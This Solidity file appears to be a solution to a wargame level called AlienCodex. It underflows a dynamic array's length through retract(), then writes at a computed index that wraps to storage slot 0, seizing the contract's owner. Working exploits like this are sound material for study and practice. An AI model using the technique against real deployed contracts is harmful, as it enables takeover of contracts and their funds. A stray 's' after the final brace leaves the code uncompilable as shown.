// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface AlienCodex  {

  function contact() external view  returns(bool);
  function codex(uint) external view returns(bytes32);
  function owner() external view returns (address);
  
  function makeContact() external ;
  function record(bytes32) external ;
  function retract()  external ;
  function revise(uint i , bytes32 _content)  external ; 
}

contract hack {
  AlienCodex target;
  constructor(address _address) {
    target = AlienCodex(_address);
  }


  function attack() public  {
    target.makeContact();
    target.retract();
    //storing the value 2^256-1
    uint max = type(uint).max ;
    // What is the slot Id of bytes32 [] .
    // Since owner is in slot0 :20bytes and bool is 1 bytes then slot id of the array is 1.
    uint i = max - uint(keccak256(abi.encode(1))) +1 ;
    target.revise(i, bytes32(uint(uint160(msg.sender))) );
    require(target.owner() == msg.sender) ;
  }
}s
